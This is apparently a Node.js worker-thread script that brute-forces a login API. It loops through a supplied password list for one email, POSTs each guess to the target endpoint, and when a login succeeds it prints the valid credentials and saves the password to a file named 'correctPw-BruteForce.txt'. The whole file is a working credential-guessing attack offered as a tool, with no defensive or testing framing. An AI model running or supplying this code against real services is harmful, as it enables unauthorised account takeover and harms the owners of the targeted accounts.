import chalk from 'chalk'
import 'dotenv/config'
import { workerData, parentPort } from 'worker_threads'

import path from 'path'
import fs from 'fs'
const fileName='correctPw-BruteForce.txt'

// Get data sent by Worker thread
const {API_URL,email,passwords} = workerData


async function bruteForceAttack(password){
    try {
        // fetch data with post Request
        const response = await fetch(API_URL,{
            method:'POST',
            body:JSON.stringify({
                email,
                password
            }),
            headers:{
                'Content-type':'application/json'
            }
        })
        // if response with status OK then return true and log the password
        if(response.ok){
            console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid`));
            fs.writeFileSync(path.resolve(fileName),password,'utf-8')
            process.exit(0)
        }
        
        console.log(chalk.red(`Login Failed, Password ${password} invalid`));
        return 
    } catch (error) {
        console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
        return 
    }
}

async function main(){     
    for(let password of passwords){
        await bruteForceAttack(password)
    }
    parentPort.postMessage('done')
}

main()